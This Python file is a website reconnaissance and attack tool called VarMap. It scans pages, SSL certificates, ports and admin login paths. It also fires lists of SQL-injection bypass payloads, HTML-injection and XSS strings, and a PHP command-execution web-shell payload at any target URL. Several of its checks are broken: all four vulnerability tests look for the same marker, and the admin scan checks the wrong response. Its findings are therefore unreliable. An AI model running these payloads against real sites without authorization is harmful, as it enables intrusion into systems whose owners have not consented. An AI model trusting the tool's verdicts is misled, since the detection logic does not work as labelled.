# Variable Mapping Tools - Exploiter Info Website
# Version : 1.2.5
import argparse
import requests
import socket
import time
import hashlib
import random
import datetime
import os
import ssl
from bs4 import BeautifulSoup

def __banner__():
	date_time = datetime.datetime.now()
	time_now = date_time.strftime("[+] Starting %H:%M:%S /%Y:%m:%d")
	print('''
               ___
 _____          H    
|  |  |___ ___ [,] _____ ___ ___  {1.2.5}
|  |  | .'|  _|[)]|     | .'| . | {Pham Chien}
 \___/|__,|_|  [(]|_|_|_|__,|  _|
                V           |_|   ghostmanews.blogspot.com 
        Copyright : Pham Chien
        Team : GhostMan Security
''')
	print(time_now)
	print("")
def __session__():
	argparsers = argparse.ArgumentParser(description="[!] VarMap Tool - Exploring Website Information VarMap V1.2")
	argparsers.add_argument('-u', '--url', type=str, help='URL target (ex : https://test.com)')
	argparsers.add_argument('-c', '--check', action='store_true', help='Checking target URL')
	argparsers.add_argument('-v', '--version', action='store_true', help='Checking Version Target URL')
	argparsers.add_argument('-p', '--propertie', action='store_true', help='Scanning ALL Propertie URL Target')
	argparsers.add_argument('-i', '--infomation', action='store_true', help='Scanning ALL Infomation URL Target')
	argparsers.add_argument('-f', '--filter', action='store_true', help='Scanning ALL Filter URL Target')
	argparsers.add_argument('-m', '--meta', action='store_true', help='Checking Items META URL target')
	argparsers.add_argument('-l', '--link', action='store_true', help='Checking Items LINKS URL target')
	argparsers.add_argument('-sr', '--script', action='store_true', help='Checking Items script URL target')
	argparsers.add_argument('--sqlscan', action='store_true', help='Payload Scan Vulnerable SQL injection')
	argparsers.add_argument('--sslcert', action='store_true', help='Scan SSL CERT')
	argparsers.add_argument('--admin', action='store_true', help='scan admin login page')
	argparsers.add_argument('-V', '--vulnerable', action='store_true', help='Testing ALL Vulnerable For URL target')
	argparsers.add_argument('--portssl', type=int, help='set port ssl scanner')
	
	argparsers.add_argument('-d', '--dns', action='store_true', help='Scan DNS and PORT Server Target (ex python3 varmap.py --url (ex : http://test.com/) --check --dns')
	argparsers.add_argument('--about', action='store_true', help='Show This About')

	args = argparsers.parse_args()

	URL = args.url
	CHECK = args.check
	VER = args.version

	if URL:
		if CHECK:
			start_time = datetime.datetime.now()
			now_time = start_time.strftime("%H:%M:%S")
			print("[{}] [info] starting check response from {}".format(now_time, URL))
			response = requests.get(URL)
			if response.status_code == 200:
				print(f"[{now_time}] [info] the target URL as responsed , status code : 200")
				time.sleep(0.90)
				print(f"[{now_time}] [info] starting checking...")
				time.sleep(1)
				def __check__():
					your_domain = URL.replace("http://", "").replace("https://", "")
					remove_http = your_domain.split("://")
					URL_new = remove_http[-1]
					remove = URL_new.replace("/", "")
					results = remove.split("/")
					remove_now = "/".join(results[-1])
					def __getid__():
						id_code = hashlib.md5(URL.encode()).hexdigest()
						versions = response.raw.version
						md5_url = hashlib.md5(URL_new.encode()).hexdigest()
						print("+--------------------------------+")
						print("INFOMATION BASIC : ")
						print(f"Info Show : {now_time}")
						print("Target : {}".format(URL))
						print("Version : {}".format(versions))
						print("Path : {}".format(remove_now))
						print("ID : {}".format(id_code))
						print("MD5 : {}".format(md5_url))
						print("+--------------------------------+")
						
						time.sleep(0.50)
					__getid__()
				__check__()

				if VER:
					code = response.raw.version
					print(f"[{now_time}] Version HTTP : ", code)

				if args.propertie:
					properties = dir(response)
					for line in properties:
						print("[{}] properties : {}".format(now_time, line))
						time.sleep(0.10)
				if args.infomation:
					soup = BeautifulSoup(response.text, 'html.parser')
					script = soup.find_all('script')
					link = soup.find_all('link')
					for lines in script:
						print("[{}] [info] script java : {}".format(now_time, lines))
						time.sleep(0.10)
					for lines in link:
						print("[{}] [info] link : {}".format(now_time, lines))
						time.sleep(0.10)

				if args.filter:
					def __getfilter__():
						script = BeautifulSoup(response.text, 'html.parser')
						var_script = script.find_all('script')
						filter_properties = vars(response)
						print(var_script)
						for data, line in filter_properties.items():
							if data != "_content":
								if data:
									print("[{}] [info] filter : {} : {}".format(now_time, data, line))
									time.sleep(0.50)
								else:
									print(f"[{now_time}] [info] No Filter..")
					__getfilter__()
				if args.meta:
					def __getmeta__():
						meta_script = BeautifulSoup(response.text, 'html.parser')
						scanning = meta_script.find_all('meta')
						for line_meta in scanning:
							print("[{}] [info] Meta Line : {}".format(now_time, line_meta))
							time.sleep(0.10)
					__getmeta__()

				if args.link:
					def __getlink__():
						get_link = BeautifulSoup(response.text, 'html.parser')
						link = get_link.find_all('link')
						for line in link:
							print("[{}] [info] Link Line : {}".format(now_time, line))
							time.sleep(0.10)
					__getlink__()

				if args.script:
					def __script__():
						get_script = BeautifulSoup(response.text, 'html.parser')
						scriptsheet = get_script.find_all('script')
						for line in scriptsheet:
							print("[info] script : {}".format(line))
							time.sleep(0.10)
					__script__()

				if args.sqlscan:
					def _startpayload_():
						session = True 
						if args.sqlscan:
							def __sql__():
								# payload bypass SQLi
								payloads = [
									"%27*/",
									"/*/*/%27",
									"/*/*/ORDER BY 1--",
									"/*/*/ORDER BY 2--",
									"/*/*/ORDER BY 3--",
									"/*/*/ORDER BY 4--",
									"/*/*/OR 1=1--",
									"/*/*/Union Select 1,2,3--",
									"/*/*/Union Select 1,2,3,4,5,6--",
									"/*/*/Union Select 1,2,3,4,5,6,7,8,9,10--",
									"/**8**/and/**8**/mod(9,9)/**/",
									"/**8**/",
									"/**8**//%23%0a",
									"*/%27",
									"%250a",
									"%25AAAAAAAAAAAAAAAAAAAA%0a",
									"%23+++++++++++++++++++++%0a",
									"--20-%0A",
									"/**//*12345UNION+SELECT*/**/"
								]
								for payload_bypass in payloads:
									response_output = requests.get(URL + payload_bypass)
									if response_output.status_code == 200:
										if "SQL" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("Error : {}".format(error))
											exit()
										elif "MySQL" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("Error : {}".format(error))
											exit()
										elif "mysql" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("Error : {}".format(error))
											exit()
										elif "at line" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("[{}] Error : {}".format(now_time, error))
											exit()
										else:
											print("")
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Failed !!! ")

									elif response_output.status_code == 403:
										print("")
										print(f"[{now_time}] [info] SERVER BLOCKED")
										exit()
									else:
										print("")
										print(f"[{now_time}] [info] URL BLOCKED !!")
										exit()
							__sql__()
					_startpayload_()

			if args.sslcert:
				PORT = args.portssl
				if PORT:
					def __remove_http__():
						http_remove = URL.replace("http://", "").replace("https://", "")
						urls = http_remove.split("://")
						result = urls[-1]
						remove_path = result.replace("/", "")
						paths = remove_path.split("/")
						URL_NEW = paths[-1]

						time_checking = datetime.datetime.now()
						starting_time = time_checking.strftime("%H:%M:%S")
						script_context = ssl.create_default_context()
						
						with socket.create_connection((URL_NEW, PORT)) as sock:
							with script_context.wrap_socket(sock, server_hostname=URL_NEW) as socks:
								get_ssl = socks.getpeercert()

						for keys_data, line_value in get_ssl.items():
							print("[{}] [info] {} : {}".format(start_time, keys_data, line_value))
							print("[{}] [info] {}".format(starting_time, script_context))
							time_sleep = 0.20
							time.sleep(time_sleep)
					__remove_http__()
				else:
					print("[{}] [warning] Please Agian, You Not Set PORT ( ex : python3 varmap.py --url https://testurl.com --check --sslcert --portssl 443 )".format(now_time))
					exit()

			if args.dns:
				def scan_dns():
					http_remove = URL.replace("http://", "").replace("https://", "")
					urls = http_remove.split("://")
					result = urls[-1]
					remove_path = result.replace("/", "")
					paths = remove_path.split("/")
					URL_NEW = paths[-1]
					get_dns = socket.gethostbyname(URL_NEW)
					print("[{}] [info] IP DNS : {}".format(now_time, get_dns))
					def scan_port():
						s = socket.socket(
							socket.AF_INET,
							socket.SOCK_STREAM
						)
						s.settimeout(2)
						port = [
							21,
							22,
							25,
							80,
							443,
							8080,
							2222,
							995,
							35500,
							20,
						]
						for PORTS in port:
							check_port = s.connect_ex((get_dns, PORTS))
							try:
								if check_port == 0:
									print("[{}] [info] {} : {} => Status : Open".format(now_time, get_dns, PORTS))
									time.sleep(0.20)
								else:
									print("[{}] [info] {} : {} => Status : Close".format(now_time, get_dns, PORTS))
									time.sleep(0.20)
							except socket.error:
								print("error")
						s.close()
					scan_port()
				scan_dns()

			if args.admin:
				def scanning_admin():
					payloads_panel = [
						'/admin',
						'/cpanel',
						'/login',
						'/wp-admin',
						'/wp-login',
						'/admin/login.php',
						'/login.php',
						'/admin.php',
					]
					for check_admin in payloads_panel:
						headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"}
						responsed = requests.get(URL + check_admin, headers=headers)
						if response.status_code == 200:
							print("[{}] [info] status : {} [ your path => {} ]".format(now_time, responsed.status_code, check_admin))
				scanning_admin()

			if args.vulnerable:
				def testing_vuln():
					payload = [
						# HTML Injection Vulnerable
						"/*/<h1>Testing By VarMap</h1>",
						# XSS Vulnerable
						"/*/<script>document.body.innerHTML=('Testing By VarMap');</script>",
						# SQL Injection Vulnerable
						"/*/filter?category=Testing By VarMap' OR 1=1--",
						# Backdoor PHP
						"/*/<php? system(\$_GET['cmd']); ?>",
					]

					print(f"[{now_time}] [info] Starting Exploit 4 Vulnerable...")
					time.sleep(1)
					print(f"[{now_time}] [info] Random Agent...")
					time.sleep(1)
					for payloads in payload:
						print(f"[{now_time}] [info] Random Payloading...")
						time.sleep(0.20)
						responsed = requests.get(URL + payloads)
						if "Testing By VarMap" in responsed.text:
							print(f"[{now_time}] [info] HTML Injection : vulnerable ")
							time.sleep(0.30)
						else:
							print(f"[{now_time}] [info] HTML Injection : Not vulnerable")
							time.sleep(0.20)

						if "Testing By VarMap" in responsed.text:
							print(f"[{now_time}] [info] XSS Injection : vulnerable ")
							time.sleep(0.30)
						else:
							print(f"[{now_time}] [info] XSS Injection : Not vulnerable")
							time.sleep(0.20)

						if "Testing By VarMap" in responsed.text:
							print(f"[{now_time}] [info] SQL Injection : vulnerable ")
							time.sleep(0.30)
						else:
							print(f"[{now_time}] [info] SQL Injection : Not vulnerable")
							time.sleep(0.20)

						if "Testing By VarMap" in responsed.text:
							print(f"[{now_time}] [info] PHP Backdoor : vulnerable ")
							time.sleep(0.30)
						else:
							print(f"[{now_time}] [info] PHP Backdoor : Not vulnerable")
							time.sleep(0.20)
				testing_vuln()

			else:
				print("[warning] the target not response, please agian")
				exit()
		else:
			print("[info] you not set payload checking")
	else:
		print("Usage : python varmap.py --url <http://test.com> --check --version")
		print("Typer Command : python varmap.py -h for help")
		print('''
[!] VarMap Tool - Exploring Website Information

[+] Technology is constantly evolving, and websites have become an integral part of modern life. However, with the increasing popularity of websites, managing information on them has also become more complex. That's where the VarMap tool comes in, providing an effective solution for scanning and discovering information from a website.''')
		exit()

	if args.about:
		print('''
[!] VarMap Tool - Exploring Website Information

[+] Technology is constantly evolving, and websites have become an integral part of modern life. However, with the increasing popularity of websites, managing information on them has also become more complex. That's where the VarMap tool comes in, providing an effective solution for scanning and discovering information from a website.
''')
		exit()

if __name__ == '__main__':
	__banner__()
	__session__()
